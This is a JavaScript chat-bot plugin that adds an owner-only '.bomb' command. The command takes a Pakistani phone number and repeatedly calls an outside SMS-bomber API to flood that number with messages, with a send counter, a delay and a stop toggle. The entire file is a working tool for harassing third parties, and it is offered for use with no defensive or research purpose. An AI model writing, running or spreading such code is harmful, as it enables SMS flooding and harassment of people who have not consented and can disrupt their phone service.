const { cmd } = require('../command');

// Settings
const SMS_API = "https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=";
let isBombing = false;
let bombCount = 0;
const MAX_BOMBS = 10; // Maximum SMS limit
const DELAY = 3000; // 3 seconds delay

cmd({
    pattern: "bomb",
    react: "💣",
    desc: "Start/Stop SMS bombing",
    category: "main",
    filename: __filename
}, async (conn, mek, m, { from, isOwner, text, reply }) => {
    try {
        // Owner check
        if (!isOwner) return reply("❌ Only bot owner can use this command!");

        // Stop bombing if active
        if (isBombing) {
            isBombing = false;
            return reply(`✅ Bombing stopped! Sent ${bombCount} SMS`);
        }

        // Extract and validate number
        const number = text.split(' ')[1]?.replace(/[^0-9]/g, '');
        if (!number || !number.startsWith('92') || number.length !== 11) {
            return reply("❌ Invalid PK number! Use: .bomb 923001234567");
        }

        // Start bombing
        isBombing = true;
        bombCount = 0;
        reply(`💣 Bombing STARTED on ${number}\nMax ${MAX_BOMBS} SMS will be sent`);

        // Bombing loop
        const bombInterval = setInterval(async () => {
            if (!isBombing || bombCount >= MAX_BOMBS) {
                clearInterval(bombInterval);
                isBombing = false;
                reply(`✅ Sent ${bombCount} SMS to ${number}`);
                return;
            }

            try {
                const response = await fetch(SMS_API + number);
                if (response.ok) {
                    bombCount++;
                    console.log(`Bomb ${bombCount} sent to ${number}`);
                } else {
                    throw new Error(`API Error: ${response.status}`);
                }
            } catch (error) {
                clearInterval(bombInterval);
                isBombing = false;
                reply(`❌ Error: ${error.message}`);
                console.error("Bombing Error:", error);
            }
        }, DELAY);

    } catch (error) {
        console.error("Command Error:", error);
        reply(`⚠️ System Error: ${error.message}`);
    }
});
